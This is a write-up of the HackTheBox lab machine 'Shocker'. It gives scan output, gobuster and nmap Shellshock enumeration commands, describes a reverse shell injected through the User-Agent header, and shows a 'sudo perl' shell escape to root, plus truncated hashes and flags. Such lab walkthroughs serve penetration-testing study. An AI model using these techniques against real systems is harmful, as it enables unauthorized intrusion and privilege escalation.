[HackTheBox] Shocker
===============
date: 13/Nov/2019
summary: This is a writeup for HackTheBox machine Shocker.
tags: hackthebox, writeup

## Overview
This is a writeup for HTB VM [Shocker](https://www.hackthebox.eu/home/machines/profile/108). Here are stats for this machine from [machinescli](https://github.com/7h3rAm/machinescli):

![writeup.overview.machinescli](/static/files/posts_htb_shocker/machinescli.png.webp)

### Killchain
Here's the killchain (`enumeration` → `exploitation` → `privilege escalation`) for this machine:

![writeup.overview.killchain](/static/files/posts_htb_shocker/killchain.png.webp)

### TTPs
1\. `80/tcp/http/Apache httpd 2.4.18 ((Ubuntu))`: [exploit_shellshock](https://github.com/7h3rAm/writeups#exploit_shellshock), [privesc_sudoers](https://github.com/7h3rAm/writeups#privesc_sudoers)  


## Phase #1: Enumeration
1\. Here's the Nmap scan result:  
```
# Nmap 7.70 scan initiated Wed Nov 13 16:00:23 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.shocker/results/10.10.10.56/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.shocker/results/10.10.10.56/scans/xml/_quick_tcp_nmap.xml 10.10.10.56
Increasing send delay for 10.10.10.56 from 0 to 5 due to 145 out of 482 dropped probes since last increase.
Nmap scan report for 10.10.10.56
Host is up, received user-set (0.11s latency).
Scanned at 2019-11-13 16:00:24 PST for 25s
Not shown: 998 closed ports
Reason: 998 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 13 16:00:49 2019 -- 1 IP address (1 host up) scanned in 26.24 seconds
```

2\. Here's the summary of open ports and associated [AutoRecon](https://github.com/Tib3rius/AutoRecon) scan files:  

![writeup.enumeration.steps.2.1](/static/files/posts_htb_shocker/openports.png.webp)  

3\. We try Shellshock related enumeration steps to identify interesting scripts to be used as entrypoint:  
```
gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403
gobuster -u 10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -s 200,204,301,302,307,403 -k -x sh,pl
nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
```

![writeup.enumeration.steps.3.1](/static/files/posts_htb_shocker/screenshot01.png.webp)  

![writeup.enumeration.steps.3.2](/static/files/posts_htb_shocker/screenshot02.png.webp)  

4\. The `user.sh` script looks interesting and we manually confirm that it is vulnerable to Shellshock:  

![writeup.enumeration.steps.4.1](/static/files/posts_htb_shocker/screenshot03.png.webp)  

![writeup.enumeration.steps.4.2](/static/files/posts_htb_shocker/screenshot04.png.webp)  

### Findings
#### Open Ports
```
80/tcp    |  http  |  Apache httpd 2.4.18 ((Ubuntu))
2222/tcp  |  ssh   |  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
```
#### Files
```
http://10.10.10.56/cgi-bin/user.sh
```

## Phase #2: Exploitation
1\. We inject a Bash reverse shell command within the HTTP User-Agent header and get interactive access on the target system:  

![writeup.exploitation.steps.1.1](/static/files/posts_htb_shocker/screenshot05.png.webp)  

![writeup.exploitation.steps.1.2](/static/files/posts_htb_shocker/screenshot06.png.webp)  

2\. We can now view the contents of the first flag file, `user.txt`:  

![writeup.exploitation.steps.2.1](/static/files/posts_htb_shocker/screenshot07.png.webp)  

## Phase #2.5: Post Exploitation
```
shelly@Shocker> id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker>  
shelly@Shocker> uname
Linux Shocker 4.4.0-96-generic #119-Ubuntu SMP Tue Sep 12 14:59:54 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
shelly@Shocker>  
shelly@Shocker> ifconfig
ens33 Link encap:Ethernet  HWaddr 00:50:56:b9:fe:2c
      inet addr:10.10.10.56  Bcast:10.10.10.255  Mask:255.255.255.0
      inet6 addr: fe80::250:56ff:feb9:fe2c/64 Scope:Link
      inet6 addr: dead:beef::250:56ff:feb9:fe2c/64 Scope:Global
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:769099 errors:0 dropped:0 overruns:0 frame:0
      TX packets:542509 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:1000
      RX bytes:65025189 (65.0 MB)  TX bytes:92873202 (92.8 MB)
shelly@Shocker>  
shelly@Shocker> users
root
shelly
```

## Phase #3: Privilege Escalation
1\. From the output of the `sudo -l`, we know that the user `shelly` can execute `perl` with `sudo` privileges. We use this to execute Bash and get elevated privileges:  
```
sudo -l
sudo perl -e 'exec "/bin/sh";'
```

![writeup.privesc.steps.1.1](/static/files/posts_htb_shocker/screenshot08.png.webp)  

![writeup.privesc.steps.1.2](/static/files/posts_htb_shocker/screenshot09.png.webp)  

2\. We then view the contents of the `root.txt` file to complete the challenge:  

![writeup.privesc.steps.2.1](/static/files/posts_htb_shocker/screenshot10.png.webp)  

## Loot
### Hashes
```
root:$6$BVgS5ne0$Q6rV3guK7QQUy7uRMwbQ3vv2Y5I9yQUhIzvrIhuiDso/o5UfDxZw7MMq8atR3UdJjhpkFVxVD0cVtjXQd........................
shelly:$6$aYLAoDIC$CJ8f8WSCT6GYmbx7x8z5RfrbTG5mpDkkJkLW097hoiEw3tqei2cE7EcUTYdJTVMSa3PALZeBHjhiFR8Ba........................
```
### Flags
```
/home/shelly/user.txt: 2ec24e11320026d1e70ff...........
/root/root.txt: 52c2715605d70c76190305..........
```

## References
* <https://www.hackthebox.eu/home/machines/profile/108>  
* <https://www.youtube.com/watch?v=IBlTdguhgfY>  
* <https://xd3m0n.xyz/htb_shocker/>  
